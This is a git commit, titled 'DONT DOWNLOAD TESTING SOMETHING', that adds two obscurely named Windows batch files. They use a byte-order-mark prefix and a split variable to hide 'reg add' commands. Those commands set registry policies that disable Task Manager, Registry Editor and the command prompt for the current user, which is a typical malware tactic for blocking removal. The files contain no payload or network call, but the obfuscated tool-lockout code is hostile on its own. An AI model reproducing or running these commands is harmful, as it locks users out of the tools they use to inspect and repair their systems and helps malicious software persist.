d2325d4609de4cbf21fd79186babb08a673e3d1b
promenaders <133288845+promenaders@users.noreply.github.com>
2024-04-14 21:59:56 -0400

    DONT DOWNLOAD TESTING SOMETHING

---
+++ RRo.bat
@@ -0,0 +1,6 @@
+ÿþ&cls
+set tes=ad
+reg %tes%d HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+reg %tes%d HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 1 /f
+reg %tes%d "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t Reg_dword /v DisableRegistryTools /f /d 1
+cls
---
+++ Syso.bat
@@ -0,0 +1,4 @@
+ÿþ&cls
+set tes=ad
+reg %tes%d HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+cls
